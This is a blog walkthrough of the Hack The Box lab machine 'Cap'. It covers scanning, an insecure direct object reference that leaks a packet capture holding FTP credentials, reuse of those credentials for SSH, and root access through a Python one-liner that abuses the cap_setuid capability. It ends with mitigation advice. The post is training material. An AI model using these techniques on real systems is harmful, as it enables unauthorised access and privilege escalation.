---
layout: post
title: Hack The Box Walkthrough - Cap
date: 2022-08-31
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/08/HTB/Cap
img: 2022/08/Cap/Cap.png
---


* Room: Cap
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Cap](https://app.hackthebox.com/machines/Cap)
* Author: [InfoSecJack](https://app.hackthebox.com/users/52045)

## Enumeration

I began the machine by running RustScan to look for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.50.217:21
Open 10.129.50.217:22
Open 10.129.50.217:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

Nmap scan report for target (10.129.50.217)
Host is up, received syn-ack (0.042s latency).
Scanned at 2022-08-30 19:37:09 EDT for 128s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU
297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYU
Hd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack gunicorn
| fingerprint-strings:
...
```

It found three ports:
* 21 (FTP)
* 22 (SSH)
* 80 (HTTP)

Since port 80 was open, I immediately launched feroxbuster to look for hidden pages.

```bash
$ feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -B -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏦  Collect Backups       │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      389l     1065w    19386c http://target.htb/
302      GET        4l       24w      208c http://target.htb/data => http://target.htb/
200      GET      355l     1055w    17445c http://target.htb/ip
302      GET        4l       24w      220c http://target.htb/capture => http://target.htb/data/1
[####################] - 2m    126194/126194  0s      found:4       errors:0
[####################] - 2m     63088/63088   489/s   http://target.htb
[####################] - 2m     63088/63088   488/s   http://target.htb/
```

It found a few pages, but nothing I would not find by looking at the website.

## Website

I opened a browser and looked at the website. It was some kind of security dashboard.

![Dashboard](/assets/images/2022/08/Cap/Dashboard.png "Dashboard")

The 'IP Config' and 'Network Status' pages showed basic network information. 

The 'Security Snapshot' pages were more interesting. It created a PCAP with 5 seconds of network traffic capture and showed some statistics.

![Empty Capture](/assets/images/2022/08/Cap/EmptyCapture.png "Empty Capture")

It also had a button to download the PCAP file. I downloaded it. But since there was no other traffic on the server, the PCAP was empty. As showed by the statistics.

I noticed that after the capture was done, I was redirected to `/data/1` to view the summary. I ran the capture again and I was sent to `/data/2`. I tried to access `/data/0`. I got a summary with more data in it.

![Capture With Data](/assets/images/2022/08/Cap/CaptureWithData.png "Capture With Data")

I downloaded that PCAP and opened it with Wireshark. This one had some traffic. I checked the protocols used, it was mostly FTP.

![Protocol Hierarchy](/assets/images/2022/08/Cap/ProtocolHierarchy.png "Protocol Hierarchy")

FTP traffic is all plain text, so I knew that there was a chance I would find credentials in the capture. I filtered for FTP traffic and did 'Follow TCP Stream' on the first packet. 

```
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS REDACTED
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

## FTP

I used the credentials found in the PCAP to connect to the FTP server. 

```bash
$ ftp nathan@target
Connected to target.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
229 Entering Extended Passive Mode (|||29495|)
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 27  2021 .
drwxr-xr-x    3 0        0            4096 May 23  2021 ..
lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23  2021 .cache
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null
-r--------    1 1001     1001           33 Aug 30 23:33 user.txt
226 Directory send OK.

ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||20874|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |**********************************************************************************************************************************************************************************************|    33      295.65 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (1.31 KiB/s)
```

It looked like I was in a user's home folder. I downloaded the user flag and submitted it.

Next, I looked around the server. I tried creating a `.ssh` folder to upload an SSH key, but I was not allowed to create files. I saw that I was able to `cd` outside the home folder. I went to `/var/www/html` and downloaded the code for the application. 

But then it hit me that I should probably try the same credentials in SSH.

```bash
$ ssh nathan@target                       
nathan@target's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 31 22:37:42 UTC 2022

  System load:           0.08
  Usage of /:            36.7% of 8.73GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.51.49
  IPv6 address for eth0: dead:beef::250:56ff:feb9:6cf7

  => There are 3 zombie processes.

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
```

## Getting root

It worked! Next, I looked for simple things like `sudo` and `suid` permissions. I did not find anything I could use.

```bash
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.

nathan@cap:~$ find / -perm /u=s 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
...
```

I went back to the application code I had downloaded. The code that took the network capture was interesting.

```python
@app.route("/capture")
@limiter.limit("10 per minute")
def capture():

        get_lock()
        pcapid = get_appid()
        increment_appid()
        release_lock()

        path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
        ip = request.remote_addr
        # permissions issues with gunicorn and threads. hacky solution for now.
        #os.setuid(0)
        #command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
        command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
        os.system(command)
        #os.setuid(1000)

        return redirect("/data/" + str(pcapid))
```

The code was running `setuid(0)`. It was changing to root so it could capture the network traffic. It should not have been allowed to do this. Unless it had some special [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).

```bash
nathan@cap:~$ which python3
/usr/bin/python3

nathan@cap:~$ ls -l /usr/bin/python3
lrwxrwxrwx 1 root root 9 Mar 13  2020 /usr/bin/python3 -> python3.8

nathan@cap:~$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Python had the permission to change the user id of its process. That meant I could use Python to run anything I wanted as root.

```bash
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("whoami")'
root

nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

root@cap:~# cat /root/root.txt 
REDACTED
```

## Mitigation

The issues of this box revolve around the PCAP capture. Allowing random people to capture network traffic on the server seems like a very bad idea. You never know what will end up in there. And since the files were left there with an auto-incremented id, it was easy to guess how to download the capture someone else made.

The next issue was allowing Python to change user id with capabilities. By doing this, every Python script was able to do the same. It made it easy to become root.